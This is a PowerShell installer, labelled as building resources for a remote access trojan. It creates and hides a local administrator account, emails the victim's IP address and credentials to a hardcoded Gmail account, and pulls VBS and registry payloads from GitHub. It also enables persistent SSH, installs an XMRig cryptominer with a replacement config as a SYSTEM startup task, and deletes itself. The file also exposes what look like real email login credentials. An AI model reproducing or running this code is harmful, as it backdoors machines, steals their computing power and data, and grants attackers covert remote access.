# builds resources for RAT

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}


#create admin

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    $username = ".Venom"
    $password = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
    New-LocalUser $username -Password $password -FullName ".Venom" -Description "Local admin account created via PowerShell"
    Add-LocalGroupMember -Group "Administrators" -Member $username
}


## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# Load email and password from text files
$email = "theedukkespallace@gmail.com"
$pword = "jagxxeqhkigpeqor"

# Retrieve the correct network interface alias
$interfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias

# Retrieve the IP address for the active network interface
$IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interfaceAlias).IPAddress

# Ensure other variables are correctly defined
$path = "$env:temp/$wd"
$configfile = "$env:UserName.rat"

# Overwrite or create a new configuration file
Set-Content -Path $configfile -Value ""

# Add the content to the configuration file
Add-Content -Path $configfile -Value $IP
Add-Content -Path $configfile -Value $password
Add-Content -Path $configfile -Value $path

# Convert SecureString to plain text (understand security risks)
$password = ConvertTo-SecureString $pword -AsPlainText -Force
$plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))
Add-Content -Path $configfile -Value $plainPassword

Add-Content -Path $configfile -Value $path

# Send the email with the configuration file details
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "IP Address Notification from $env:UserName" `
    -Attachment $configfile `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))


# create admin user
#$NewLocalAdmin = ".Venom"
#$Password = (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
#Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# send ip to attacker
#./smtp.ps1

#goto temp, make working dir
mkdir $path
cd $path
# mv $initial_dir/smtp.txt ./smtp.ps1
#./smtp.ps1

# registry to hide  local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"

#visual basic scrit to download the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs -OutFile "calty.vbs"

#Download modified config.json
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"

#Download Autorun starter
Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs -OutFile "RunHidden.vbs"

# enabling  persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

#install the registry
./wrev.reg; ./calty
mv $path\RunHidden.vbs $initial_dir

./RunHidden


#Create rig Folder within Folder
New-Item -Name "$wd" -Path "$path" -ItemType Directory
cd $wd

# Get the current directory
$currentDirectory = $PWD

# Download the ZIP file
Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"

#powershell -windowstyle hidden -ep bypass curl -o "/home/kali/Documents/xmrig-6.22.2-msvc-win64.zip" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip 

# Extract the ZIP file in the current directory
Expand-Archive -Path "$currentDirectory\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$currentDirectory"

# Verify extraction
#Get-ChildItem -Path $currentDirectory

#replace config.json
$newConfigPath = "$path\config.json"
$targetConfigPath = "$currentDirectory\xmrig-6.22.2\config.json"

if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "Config.json file has been replaced successfully."
} else {
    Write-Output "New config.json file not found at the specified path."
}

# Define the path to the CMD file
$CMDFilePath = "currentDirectory\start.cmd"

# Define the task name
$TaskName = "windows host start"

# Create the scheduled task action
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$CMDFilePath`""

# Create the scheduled task trigger for startup
$Trigger = New-ScheduledTaskTrigger -AtStartup

# Create the scheduled task settings
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartIfOnBatteries

# Register the scheduled task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM"

Write-Host "Scheduled task created successfully. Your CMD file will now run at startup."




# start rig
powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd

# hide venom user
cd C:\Users
attrib +h +s +r .Venom

# self delete
cd $initial_dir

Sleep (200)

del installer.ps1

